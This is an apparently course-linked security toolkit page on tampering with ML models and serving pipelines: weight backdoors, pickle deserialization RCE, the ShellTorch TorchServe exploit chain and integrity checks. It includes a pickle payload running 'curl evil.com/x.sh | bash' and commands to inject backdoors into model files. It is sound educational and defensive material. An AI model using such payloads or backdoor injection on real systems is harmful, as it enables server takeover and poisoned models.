# Model Tampering and Deployment Tampering

> **In one sentence:** Reach the model artifact or the deployment pipeline and change it directly, injecting a backdoor into the weights, patching a saved file, or exploiting a misconfigured serving stack for RCE, all without retraining.

## What it is

This is the supply-chain and infrastructure side of AI attacks. Instead of tricking a running model with clever inputs, you modify the model itself or the machinery that serves it:

- **Weight-level tampering:** edit weights post-training to plant a backdoor (a trigger pattern that forces a chosen class) or bias the output toward a target class.
- **File-level tampering / serialization abuse:** patch a saved model file, or exploit unsafe deserialization (pickle) so that loading the model runs your code.
- **Deployment tampering:** abuse an unprotected model-upload endpoint, an exposed training-data store, or a vulnerable serving framework to swap the model or gain RCE on the server.

The defensive counterpart, integrity verification, is the other half of this page: hashing, weight fingerprinting, and layer-by-layer diffing to detect exactly these changes.

## The problem it exploits

- **A model is just a file.** If an attacker can write to it (weak endpoint auth, exposed FTP, writable artifact store), they can alter behavior with surgical weight edits and no retraining cost.
- **Loading a model can execute code.** PyTorch `torch.save` uses pickle, and pickle's `__reduce__` runs arbitrary code on load. Loading an untrusted `.pt` is remote code execution waiting to happen.
- **Serving stacks are ordinary software with CVEs.** A management API bound to all interfaces, an SSRF in a workflow loader, and a vulnerable YAML deserializer chain together into full RCE (the ShellTorch case).
- **Integrity is often unverified.** Many pipelines never check that the deployed model matches a known-good reference, so tampering goes unnoticed.

## Intuition

The model is a locked safe full of learned behavior. You do not need to crack the combination if you can get behind the safe and rewire two dials: one that makes it react to your secret knock (the trigger in the first layer) and one that makes it always open to your chosen answer (the bias in the last layer). Deployment tampering is simpler still: if the delivery van (the pipeline) is unlocked, you just swap the safe for one of your own on the way to the vault.

## How it works

**Weight backdoor injection.** Modify the first layer so it fires strongly on a trigger pattern, and the last layer so that response maps to the target class. The model behaves normally on clean inputs and misclassifies only when the trigger is present.

**Output bias.** Add a large value to the target class bias in the final layer so the model favors that class.

**Serialization RCE (pickle):**

```python
class Trojan:
    def __reduce__(self):
        return (os.system, ("curl evil.com/x.sh | bash",))
torch.save(Trojan(), "model.pt")   # torch.load(...) -> RCE
```

Mitigated by `torch.load(path, weights_only=True)` or the `safetensors` format.

**Deployment tampering (ShellTorch, from the course):** a three-bug chain in TorchServe.

```
1. Management API exposed on all interfaces (misconfiguration) -> unauthenticated remote access
2. SSRF in /workflows?url= (CVE-2023-43654) -> server downloads attacker .war
3. SnakeYAML deserialization (CVE-2022-1471) -> arbitrary Java execution via ScriptEngineManager gadget
```

The `.war` carries a `spec.yaml` gadget and a malicious `ScriptEngineFactory` whose constructor runs a reverse shell, ending in RCE on the ML server.

**Integrity verification (the defense you also build offensively to prove impact):**

| Method | Catches | Limitation |
|--------|---------|-----------|
| SHA-256 file hash | Any byte change | Also flips on benign retraining |
| Weight fingerprint (mean/std/norm/checksum per layer) | Semantic weight changes | Careful perturbation can evade |
| Behavioral testing | Changed behavior | Must know what to probe |
| Layer-by-layer diff vs known-good | Exact changed tensors and elements | Needs a trusted reference |

## Threat model and prerequisites

- **Weight/file tampering:** write access to the model artifact, or the ability to get a malicious model loaded (supply chain, model hub, unprotected upload).
- **Serialization RCE:** the victim loads your untrusted `.pt` without `weights_only=True`.
- **Deployment RCE:** network reach to a misconfigured/vulnerable serving stack (exposed management API, unpatched framework). The ShellTorch lab uses SSH port forwarding to reach the management API and receive the callback.
- **Integrity verification:** you need a trusted reference model or fingerprint to diff against.

## When to use it

- You have gained write access to a model store or an upload endpoint and want to prove backdoor risk.
- Assessing whether a serving framework is exposed and patched (TorchServe, and see [vulnerable-framework-code](vulnerable-framework-code.md)).
- Demonstrating that untrusted model files are loaded unsafely.
- Building the defensive baseline: fingerprint a clean model, then detect tampering later.

## Step by step with the toolkit

The script is `app_system/model_tampering.py`, modes `inject`, `verify`, `diff`, `hash`, `fingerprint`.

Demonstrate a weight backdoor (creates a demo CNN, injects a trigger, shows clean vs tampered hashes):

```bash
python -m app_system.model_tampering --mode inject --target-class 1 \
  --model clean.pt --output tampered.pt
```

Compute and check a file hash against an expected value:

```bash
python -m app_system.model_tampering --mode hash --model model.pt \
  --hash <EXPECTED_SHA256>
```

Compute a weight fingerprint (per-layer mean, std, norm, checksum) to store as a known-good baseline:

```bash
python -m app_system.model_tampering --mode fingerprint --model clean.pt
```

Diff two model files to see exactly which tensors and how many elements changed:

```bash
python -m app_system.model_tampering --mode diff --model clean.pt --model-b tampered.pt
```

Notes:

- `--target-class` selects which class the injected backdoor and bias favor.
- The `inject` demo prints that the SHA-256 changes after tampering, which is the point: a naive hash check catches byte changes but breaks on legitimate retraining, so pair it with fingerprinting and diffing.
- For deployment RCE (ShellTorch) there is no dedicated toolkit script; use the course methodology with `curl`, `torch-workflow-archiver`, and SSH `-L`/`-R` port forwarding. See [vulnerable-framework-code](vulnerable-framework-code.md).

## Detection and defense

- **Sign and hash models**, and verify the signature/hash at every deployment.
- **Fingerprint and diff** against a known-good reference to catch semantic weight changes, not just byte changes.
- **Load safely:** `torch.load(..., weights_only=True)` or `safetensors`, never unpickle untrusted files.
- **Lock the pipeline:** authenticate and bind management APIs to localhost, validate/allow-list model source URLs (kills the SSRF step), patch the framework and its transitive deps (SnakeYAML, etc.).
- **Isolate CI/CD**, use reproducible builds, and audit third-party model and library sources.

## Explain it to a non-expert

A trained AI is a file, like a document. If someone can edit that file, they can secretly add a rule that says "when you see this special mark, always answer the way I want," and nobody notices because it behaves normally the rest of the time. Worse, on some systems just opening the file can run hidden commands. And if the delivery pipeline that ships the file is left unlocked, an attacker can swap the whole thing or take over the server. The defenses are to fingerprint the good file, refuse to open untrusted ones, and lock the pipeline.

## References

- Course material: `07-attacking-ai-app-system/03_attacking_the_system/02_deployment_tampering`
- Trail of Bits (2021) - Never a Dill Moment: Exploiting Machine Learning Pickle Files
- OWASP (2025) - LLM03:2025 Supply Chain
- CVE-2023-43654 (TorchServe SSRF), CVE-2022-1471 (SnakeYAML deserialization)
- Related toolkit pages: [vulnerable-framework-code](vulnerable-framework-code.md), [00-overview](00-overview.md)
